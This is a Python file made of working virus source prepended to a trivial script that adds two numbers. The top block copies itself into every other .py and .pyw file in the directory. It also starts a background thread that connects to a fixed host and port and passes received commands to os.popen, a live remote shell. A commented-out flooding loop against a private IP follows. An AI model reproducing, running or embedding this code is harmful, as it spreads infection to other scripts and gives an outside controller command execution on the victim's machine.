### Start of Virus ###

import sys, glob, socket, threading, os


code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False
for line in lines:
    if line == '### Start of Virus ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### End of Virus ###\n':
        break

python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False
    for line in script_code:
        if line == '### Start of Virus ###\n':
            infected = True
            break
    
    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(final_code)

#Malicious Piece of Code (Payload)
"""
target = '10.0.0.138'
fake_ip = '182.21.20.32'
port = 80

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
"""

def trojan():
    hostname = "Cosmes-MBP"
    HOST = socket.gethostbyname(hostname)
    PORT = 9090

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    cmd_mode = False

    while True:
        server_command = client.recv(1024).decode('utf-8')
        if server_command == "cmdon":
            cmd_mode = True
            client.send("You now have terminal access".encode('utf-8'))
            continue
        if server_command =="cmdoff":
            cmd_mode = False
        if cmd_mode:
            os.popen(server_command)
        else:
            if server_command == "hello":
                print("Hello World")
        client.send(f"{server_command} was exectued successfully". encode('utf-8'))

t1 = threading.Thread(target=trojan)
t1.start()
### End of Virus ###

n1 = int(input("Number 1: "))
n2 = int(input("Number 2: "))

print(n1 + n2)